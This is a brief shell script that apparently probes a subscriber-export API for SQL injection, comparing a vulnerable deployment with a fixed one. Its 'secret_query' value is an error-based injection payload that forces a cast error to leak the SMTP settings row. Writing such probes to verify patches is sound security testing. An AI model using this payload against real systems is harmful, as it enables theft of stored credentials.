#!/bin/sh
set -eu

: "${VULNERABLE_URL:?set VULNERABLE_URL}"
: "${FIXED_URL:?set FIXED_URL}"
: "${VULNERABLE_TOKEN:?set VULNERABLE_TOKEN}"
: "${FIXED_TOKEN:?set FIXED_TOKEN}"

safe_query="email LIKE '%@example.test'"
secret_query="CAST((SELECT value::text FROM settings WHERE key='smtp' LIMIT 1) AS integer) > 0"

curl -fsS -u "sql_export_probe:${VULNERABLE_TOKEN}" --get \
  --data-urlencode "query=${safe_query}" "${VULNERABLE_URL}/api/subscribers/export"
curl -sS -u "sql_export_probe:${VULNERABLE_TOKEN}" --get \
  --data-urlencode "query=${secret_query}" "${VULNERABLE_URL}/api/subscribers/export"

curl -fsS -u "sql_export_probe:${FIXED_TOKEN}" --get \
  --data-urlencode "query=${safe_query}" "${FIXED_URL}/api/subscribers/export"
curl -sS -u "sql_export_probe:${FIXED_TOKEN}" --get \
  --data-urlencode "query=${secret_query}" "${FIXED_URL}/api/subscribers/export"
